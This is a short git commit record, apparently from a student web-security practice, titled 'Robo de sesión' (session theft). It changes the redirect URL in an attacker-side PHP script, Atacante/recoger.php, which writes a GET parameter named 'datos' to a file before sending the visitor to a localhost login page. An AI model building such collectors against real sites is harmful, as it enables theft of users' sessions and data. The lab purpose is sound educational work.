daf8bc01584ef094f1e0d11938e0cb1b44767005
Unknown <pauloaiza@hotmail.es>
2017-11-29 18:11:05 +0100

    Robo de sesión

--- Atacante/recoger.php
+++ Atacante/recoger.php
@@ -4,5 +4,5 @@
 	$info = $_GET['datos'];
 	fwrite ($file, $info);
 	fclose ($file);
-	header ("Location: http://localhost/Practica2SOL/login.php");
+	header ("Location: http://localhost/SAW.Practice2.RoberthLoaiza/login.php");
 ?>
